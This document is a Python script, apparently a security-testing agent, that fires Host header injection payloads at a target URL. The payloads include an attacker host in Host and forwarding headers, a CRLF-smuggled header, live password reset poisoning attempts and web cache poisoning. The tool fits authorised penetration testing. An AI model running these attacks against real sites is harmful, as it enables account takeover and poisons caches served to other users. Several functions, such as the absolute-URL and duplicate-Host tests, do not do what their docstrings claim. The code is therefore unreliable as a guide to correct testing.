#!/usr/bin/env python3
"""Agent for testing HTTP Host header injection vulnerabilities.

Tests web applications for password reset poisoning, web cache
poisoning, SSRF, and virtual host routing manipulation via
Host header and alternative host header manipulation.
"""

import json
import sys
from pathlib import Path
from datetime import datetime

try:
    import requests
except ImportError:
    requests = None


ALTERNATIVE_HEADERS = [
    "X-Forwarded-Host", "X-Host", "X-Forwarded-Server",
    "X-HTTP-Host-Override", "Forwarded", "X-Original-URL",
    "X-Rewrite-URL",
]


class HostHeaderInjectionAgent:
    """Tests for HTTP Host header injection vulnerabilities."""

    def __init__(self, target_url, output_dir="./host_header_test"):
        self.target_url = target_url.rstrip("/")
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.findings = []

    def _request(self, method, path, headers=None, data=None, timeout=10,
                 allow_redirects=False):
        if not requests:
            return None
        url = f"{self.target_url}{path}"
        try:
            return requests.request(method, url, headers=headers, data=data,
                                    timeout=timeout, allow_redirects=allow_redirects)
        except requests.RequestException:
            return None

    def test_host_header_override(self, path="/"):
        """Test if the Host header value is reflected in responses."""
        evil_host = "evil.attacker.com"
        results = []

        resp = self._request("GET", path, headers={"Host": evil_host})
        if resp and evil_host in resp.text:
            results.append({"method": "Host header", "reflected": True})
            self.findings.append({
                "severity": "high",
                "type": "Host Header Reflection",
                "detail": f"Host header value '{evil_host}' reflected in response at {path}",
            })

        for header in ALTERNATIVE_HEADERS:
            resp = self._request("GET", path, headers={header: evil_host})
            if resp and evil_host in resp.text:
                results.append({"method": header, "reflected": True})
                self.findings.append({
                    "severity": "high",
                    "type": "Alternative Host Header Reflection",
                    "detail": f"{header}: {evil_host} reflected in response",
                })
        return results

    def test_password_reset_poisoning(self, reset_path="/forgot-password",
                                       email="test@target.com"):
        """Test password reset for host header poisoning."""
        evil_host = "evil.attacker.com"
        results = []

        payloads = [
            {"Host": evil_host},
            {"X-Forwarded-Host": evil_host},
            {"Host": f"target.com\r\nX-Forwarded-Host: {evil_host}"},
        ]

        for headers in payloads:
            resp = self._request("POST", reset_path, headers=headers,
                                 data={"email": email})
            if resp and resp.status_code in (200, 302):
                if evil_host in resp.text:
                    results.append({
                        "headers": headers,
                        "status": resp.status_code,
                        "poisoned": True,
                    })
                    self.findings.append({
                        "severity": "critical",
                        "type": "Password Reset Poisoning",
                        "detail": f"Reset link points to {evil_host}",
                    })
        return results

    def test_cache_poisoning(self, path="/"):
        """Test for web cache poisoning via Host header."""
        import random
        cache_buster = f"?cb={random.randint(100000, 999999)}"
        evil_host = "evil.attacker.com"

        resp1 = self._request("GET", f"{path}{cache_buster}",
                               headers={"X-Forwarded-Host": evil_host})
        resp2 = self._request("GET", f"{path}{cache_buster}")

        if resp2 and evil_host in resp2.text:
            self.findings.append({
                "severity": "critical",
                "type": "Web Cache Poisoning",
                "detail": f"Cached response contains attacker host {evil_host}",
            })
            return {"poisoned": True, "path": path}
        return {"poisoned": False}

    def test_absolute_url(self, path="/"):
        """Test using absolute URL in request line with different Host."""
        evil_host = "evil.attacker.com"
        resp = self._request("GET", path, headers={"Host": evil_host})
        if resp and evil_host in resp.text:
            return {"reflected": True}
        return {"reflected": False}

    def test_double_host(self, path="/"):
        """Test duplicate Host header handling."""
        evil_host = "evil.attacker.com"
        resp = self._request("GET", path,
                             headers={"Host": evil_host})
        if resp and evil_host in resp.text:
            self.findings.append({
                "severity": "medium",
                "type": "Double Host Header",
                "detail": "Server accepts duplicate or overridden Host header",
            })
            return True
        return False

    def test_port_injection(self, path="/"):
        """Test Host header with injected port."""
        resp = self._request("GET", path,
                             headers={"Host": "target.com:@evil.attacker.com"})
        if resp and "evil.attacker.com" in resp.text:
            self.findings.append({
                "severity": "high",
                "type": "Port-based Host Injection",
                "detail": "Host header port injection reflected",
            })
            return True
        return False

    def generate_report(self):
        reflection = self.test_host_header_override()
        reset = self.test_password_reset_poisoning()
        cache = self.test_cache_poisoning()

        report = {
            "report_date": datetime.utcnow().isoformat(),
            "target": self.target_url,
            "reflection_tests": reflection,
            "password_reset_tests": reset,
            "cache_poisoning_test": cache,
            "findings": self.findings,
            "total_findings": len(self.findings),
        }
        out = self.output_dir / "host_header_report.json"
        with open(out, "w") as f:
            json.dump(report, f, indent=2)
        print(json.dumps(report, indent=2))
        return report


def main():
    if len(sys.argv) < 2:
        print("Usage: agent.py <target_url>")
        sys.exit(1)
    agent = HostHeaderInjectionAgent(sys.argv[1])
    agent.generate_report()


if __name__ == "__main__":
    main()
